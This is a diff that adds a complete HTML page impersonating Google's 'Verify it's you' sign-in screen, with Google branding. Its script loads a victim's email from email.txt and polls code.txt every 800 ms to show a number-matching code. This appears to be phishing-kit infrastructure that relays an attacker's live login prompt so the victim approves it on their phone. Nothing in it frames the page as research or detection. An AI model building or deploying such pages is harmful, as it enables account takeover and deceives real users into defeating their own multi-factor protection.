@@ -1,0 +1,406 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>Verify it's you</title>
+<style>
+  :root{
+    --bg:#0c0c0c;
+    --text:#fff;
+    --muted:#BFC7CF;
+    --placeholder:#9DA6AD;
+    --accent:#A8C7FA;
+    --focus:#A8C7FA;
+    --border:#2E2E2E;
+    --corner:4px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;background:var(--bg);color:var(--text);
+    font-family:system-ui,-apple-system,"Segoe UI","Helvetica Neue",Arial,sans-serif}
+  .page{min-height:100vh;display:flex;flex-direction:column;padding:24px 24px 32px;max-width:420px;margin:auto;}  
+
+  .brand{width:46px;height:46px;border-radius:10px;margin-bottom:30px;display:flex;align-items:center;justify-content:center;}
+  .brand svg{width:100%;height:100%;}
+
+  .headline{font-size:34px;font-weight:300;line-height:1;margin:0 0 16px;}
+  .sub{
+  font-size:16px;
+  color:var(--muted);
+  margin:0 0 44px;
+  line-height:1.6; 
+}
+
+  .email-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    border: 0.6px solid silver;           
+    border-radius: 9999px;
+    padding: 4px 10px 4px 3px;            
+    color: var(--text);
+    font-size: 13.5px;
+    font-weight: 400;
+    margin-top: -30px;
+    margin-bottom: 30px;
+    width: fit-content;
+    max-width: 100%;
+    white-space: nowrap;
+    background-color: rgba(255,255,255,0.04); 
+    box-shadow: 0 0 3px rgba(192,192,192,0.2); 
+    line-height: 1;
+  }
+
+a {  
+  text-decoration: none;    
+  color: inherit;           
+}  
+  .email-pill .circle {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #1f4d1f;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    font-size: 12px;
+    color: white;
+  }
+  .email-pill .arrow {
+    margin-left: 6px;
+    border: solid var(--muted);
+    border-width: 0 1px 1px 0;             
+    display: inline-block;
+    padding: 2.5px;
+    transform: rotate(45deg);
+  }
+
+  .code-wrap{display:flex;justify-content:center;align-items:center;margin:38px 0px 22px;}
+  .code{font-size:58px;font-weight:400;line-height:1;color:var(--text);}
+  .instructions{color:var(--muted);font-size:15px;line-height:1.5;margin-bottom:28px;}
+  .instructions b{color:var(--text);font-weight:600;}
+
+  .resend-wrap { display:inline-flex; align-items:center; gap:8px; margin-top:24px; margin-bottom:48px; }
+  .resend-link {
+    color: var(--accent);
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+    display: inline-block;
+  }
+  .resend-link:hover { text-decoration: underline; }
+
+  .resend-link.disabled {
+    color: gray !important;
+    pointer-events: none;
+    opacity: 0.6;
+    cursor: default;
+    text-decoration: none;
+  }
+
+  .resend-timer {
+    color: var(--muted);
+    font-size: 13px;
+    font-weight: 400;
+    min-width: 44px; 
+    text-align: left;
+  }
+
+  .footer{margin-top:auto;padding:14px 0 6px;color:var(--muted);font-size:12px;display:flex;flex-direction:column;gap:40px;}
+  .links{display:flex;gap:32px;text-decoration:underline;}
+
+  #progressBar_for_inject{position:fixed;top:0;left:0;width:100%;height:4px;
+    background:rgba(168,199,250,0.18);overflow:hidden;display:none;z-index:99999}
+  #progressBar_for_inject::before{content:"";position:absolute;top:0;left:-40%;
+    height:100%;width:40%;background:#A8C7FA;border-radius:2px;animation:gm_indeterminate 1.4s infinite ease-out}
+  @keyframes gm_indeterminate{0%{left:-40%;width:40%}50%{left:20%;width:60%}100%{left:100%;width:80%}}
+  .check-title {
+    font-size: 20px;
+    font-weight: 500;
+    color: var(--text);
+    margin: 0 0 12px;
+    text-align: left;     
+    line-height: 1.4;
+  }
+.instructions {
+    color: var(--muted);
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 28px;
+    margin-top: 0; 
+    text-align: left;
+  }
+
+</style>
+</head>
+<body>
+
+<div id="progressBar_for_inject" aria-hidden="true"></div>
+
+<div class="page">
+  <div class="brand" aria-hidden="true">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+      <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+      <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+      <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+      <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+    </svg>
+  </div>
+
+  <h1 class="headline">Verify it's you</h1>
+  <p class="sub">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>
+
+  <div class="email-pill">
+    <div class="circle" id="pillInitial">0</div>
+    <span id="pillValue"></span>
+    <span class="arrow"></span>
+  </div>
+
+  <div class="code-wrap">
+
+    <div class="code" id="codeValue"></div>
+  </div>
+
+  <h2 class="check-title">Check your phone</h2>
+
+  <div class="instructions">
+    Pull down the notification bar on your phone and tap the sign-in notification.
+    Tap  <b>Yes</b>, then tap <b id="instructionsCode"></b> on your phone to verify it's you.
+  </div>
+
+  <div class="resend-wrap">
+    <a href="#" class="resend-link" id="resendLink" title="Resend verification">Resend it</a>
+    <span id="resendTimer" class="resend-timer" aria-hidden="true"></span>
+  </div>
+
+  <div class="footer">
+    <div style="display:inline-flex;align-items:center;gap:38px;">
+      English (United States)
+      <span style="display:inline-block;transform:scaleX(2);">▾</span>
+    </div>
+    <div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+  </div>
+</div>
+
+<script>
+
+(function(){
+  const pillRoot = document.querySelector('.email-pill');
+  if (!pillRoot) return;
+
+  pillRoot.addEventListener('click', () => {
+    const { origin, pathname, search, hash } = window.location;
+
+    let newPath = pathname.replace(/\/[^\/]+\.html$/, '/');
+
+    if (!newPath.endsWith('/')) newPath += '/';
+
+    const newUrl = origin + newPath + search + hash;
+
+    window.location.replace(newUrl);
+  }, { passive: true });
+})();
+
+(function(){
+
+  const CODE_FILE = 'code.txt';    
+  const EMAIL_FILE = 'email.txt';  
+  const POLL_MS = 800;
+  const RESEND_COOLDOWN_SEC = 45;
+  const RESEND_STORAGE_KEY = 'resend_disabled_until_v1';
+
+  const codeEl = document.getElementById('codeValue');
+  const instrEl = document.getElementById('instructionsCode');
+  const pillEl = document.getElementById('pillValue');
+  const pillInitialEl = document.getElementById('pillInitial');
+  const resend = document.getElementById('resendLink');
+  const resendTimer = document.getElementById('resendTimer');
+
+  if(!codeEl || !instrEl || !pillEl || !pillInitialEl || !resend || !resendTimer){
+    console.error('Required DOM nodes missing: #codeValue, #instructionsCode, #pillValue, #pillInitial, #resendLink, #resendTimer');
+    return;
+  }
+
+  let lastCode = null;
+
+  function extractCode(text){
+    if(!text) return null;
+    const m = text.match(/\b\d{1,6}\b/);
+    if(m) return m[0];
+    const t = text.trim();
+    return t.length ? t.split(/\s+/)[0].slice(0,8) : null;
+  }
+
+  function lastNonEmptyLine(text){
+    if(!text) return null;
+    const lines = text.split(/\r?\n/).map(s => s.trim()).filter(Boolean);
+    return lines.length ? lines[lines.length -1] : null;
+  }
+
+  async function fetchCodeOnce(){
+    try{
+      const res = await fetch(CODE_FILE, { cache: 'no-store' });
+      if(!res.ok) throw new Error('HTTP ' + res.status);
+      const txt = await res.text();
+      return extractCode(txt);
+    }catch(err){
+      console.warn('code.txt fetch error:', err);
+      return null;
+    }
+  }
+
+  async function fetchEmailOnce(){
+    try{
+      const res = await fetch(EMAIL_FILE, { cache: 'no-store' });
+      if(!res.ok) throw new Error('HTTP ' + res.status);
+      const txt = await res.text();
+      return lastNonEmptyLine(txt);
+    }catch(err){
+      console.warn('email.txt fetch error:', err);
+      return null;
+    }
+  }
+
+  function updateCode(value){
+    if(!value) return;
+    if(value === lastCode) return;
+    lastCode = value;
+    codeEl.textContent = value;
+    instrEl.textContent = value;
+    console.log('Code updated to', value);
+  }
+
+  (async function(){
+    const email = await fetchEmailOnce();
+    if(email){
+      pillEl.textContent = email;
+      pillInitialEl.textContent = (email.trim().charAt(0) || '0').toUpperCase();
+      console.log('Loaded email:', email);
+    }
+  })();
+
+  (async function(){
+    const initial = await fetchCodeOnce();
+    if(initial) updateCode(initial);
+    setInterval(async ()=>{
+      const c = await fetchCodeOnce();
+      if(c) updateCode(c);
+    }, POLL_MS);
+  })();
+
+  const progressBar = document.getElementById('progressBar_for_inject');
+  function showProgress(ms=2500){
+    if(progressBar) progressBar.style.display='block';
+    setTimeout(()=>{ if(progressBar) progressBar.style.display='none'; }, ms);
+  }
+
+  function applyInlineDisabledStyles(el){
+    if(!el) return;
+    el.style.pointerEvents = 'none';
+    el.style.opacity = '0.6';
+    el.style.color = 'gray';
+    el.style.cursor = 'default';
+    el.style.textDecoration = 'none';
+  }
+  function clearInlineDisabledStyles(el){
+    if(!el) return;
+    el.style.pointerEvents = '';
+    el.style.opacity = '';
+    el.style.color = '';
+    el.style.cursor = '';
+    el.style.textDecoration = '';
+  }
+
+  let countdownInterval = null;
+
+  function enableResend(el){
+    if(!el) return;
+    el.classList.remove('disabled');
+    clearInterval(countdownInterval);
+    countdownInterval = null;
+    clearInlineDisabledStyles(el);
+
+    el.textContent = 'Resend it';
+
+    resendTimer.textContent = '';
+    el.removeAttribute('title');
+    el.removeAttribute('aria-label');
+    localStorage.removeItem(RESEND_STORAGE_KEY);
+  }
+
+  function startResendCooldown(el, seconds){
+    if(!el) return;
+
+    el.classList.add('disabled');
+    applyInlineDisabledStyles(el);
+
+    const endsAt = Date.now() + seconds * 1000;
+    localStorage.setItem(RESEND_STORAGE_KEY, String(endsAt));
+
+    function updateRemaining(){
+      const remaining = Math.ceil((endsAt - Date.now()) / 1000);
+      if(remaining <= 0){
+        enableResend(el);
+        return;
+      }
+
+      el.textContent = 'Resend it';
+      el.setAttribute('title', `Resend available in ${remaining}s`);
+      el.setAttribute('aria-label', `Resend disabled, ${remaining} seconds remaining`);
+      resendTimer.textContent = `(${remaining}s)`;
+    }
+
+    updateRemaining();
+
+    if(countdownInterval) clearInterval(countdownInterval);
+
+    countdownInterval = setInterval(() => {
+      updateRemaining();
+    }, 1000);
+  }
+
+  function resumeCooldownIfNeeded(el){
+    const stored = localStorage.getItem(RESEND_STORAGE_KEY);
+    if(!stored) {
+
+      startResendCooldown(el, RESEND_COOLDOWN_SEC);
+      return;
+    }
+    const endsAt = Number(stored);
+    if(Number.isNaN(endsAt)) { localStorage.removeItem(RESEND_STORAGE_KEY); 
+
+      startResendCooldown(el, RESEND_COOLDOWN_SEC);
+      return;
+    }
+    const remainingMs = endsAt - Date.now();
+    if(remainingMs <= 0){
+      localStorage.removeItem(RESEND_STORAGE_KEY);
+      enableResend(el);
+      return;
+    }
+    const remainingSec = Math.ceil(remainingMs / 1000);
+    startResendCooldown(el, remainingSec);
+  }
+
+  if(resend){
+
+    resumeCooldownIfNeeded(resend);
+
+    resend.addEventListener('click', e=>{
+      e.preventDefault();
+
+      if(resend.classList.contains('disabled') || localStorage.getItem(RESEND_STORAGE_KEY)){
+        return;
+      }
+
+      showProgress();
+
+      startResendCooldown(resend, RESEND_COOLDOWN_SEC);
+
+    });
+  }
+})();
+</script>
+</body>
+</html>
